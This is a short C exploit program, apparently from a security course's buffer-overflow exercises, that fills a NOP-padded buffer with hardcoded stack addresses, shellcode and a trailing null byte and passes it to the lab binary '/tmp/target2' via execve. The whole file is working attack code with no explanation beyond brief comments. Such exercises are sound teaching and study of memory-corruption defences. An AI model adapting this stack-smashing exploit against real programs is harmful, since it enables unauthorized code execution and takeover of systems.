#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char buffer[181];
  memset(buffer, 0x90, 181);
  memcpy(buffer + 12, "\x04\xfd\xff\xbf", 4); // beginning of the buffer + 4
  memcpy(buffer + 16, "\x08\xfd\xff\xbf", 4); // beginning of the buffer + 8
  memcpy(buffer + 135, shellcode, 45);
  memcpy(buffer + 180, "\x00", 1); // beginning of the buffer

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
